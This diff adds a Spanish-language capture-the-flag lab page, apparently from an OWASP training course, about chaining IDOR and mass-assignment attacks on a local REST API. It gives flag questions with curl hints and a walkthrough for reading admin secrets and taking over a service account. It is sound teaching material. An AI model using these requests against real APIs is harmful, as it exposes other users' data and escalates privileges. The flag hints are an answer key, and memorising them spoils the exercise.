@@ -1,0 +1,44 @@
+---
+index: 4
+title: "Lab: IDOR chain en API REST"
+questions:
+  - id: owasp-top-10-t04-q01
+    prompt: "Accede al perfil del admin (id=1) con ?expand y envía su flag 'secret'."
+    hint: "curl 'http://127.0.0.1:18096/api/user/1?expand'"
+    kind: flag
+  - id: owasp-top-10-t04-q02
+    prompt: "Lee el internal_note del pedido 1002 del admin."
+    hint: "curl http://127.0.0.1:18096/api/order/1002"
+    kind: flag
+  - id: owasp-top-10-t04-q03
+    prompt: "Usa mass assignment en /api/me: cambia user_id=4 y lee la flag del servicio."
+    hint: "curl 'http://127.0.0.1:18096/api/me?user_id=4'"
+    kind: flag
+---
+
+## IDOR encadenado
+
+El lab simula una API REST donde eres alice (id=2). Encadena tres ataques:
+
+### 1. IDOR básico: leer datos de otro usuario
+```bash
+curl http://127.0.0.1:18096/api/user/1
+# Ves el perfil del admin (incluye api_key pero NO secret)
+
+curl "http://127.0.0.1:18096/api/user/1?expand"
+# Con ?expand ves TODOS los campos, incluido secret = FLAG
+```
+
+### 2. IDOR en pedidos
+```bash
+curl http://127.0.0.1:18096/api/order/1002
+# Pedido del admin con internal_note = FLAG
+```
+
+### 3. Mass assignment
+```bash
+curl "http://127.0.0.1:18096/api/me?user_id=4&role=admin"
+# El endpoint acepta user_id y role como parámetros → te conviertes en svc_backup
+```
+
+La cadena completa: enumerar usuarios → IDOR a admin → expand para secret → mass assignment a service account.
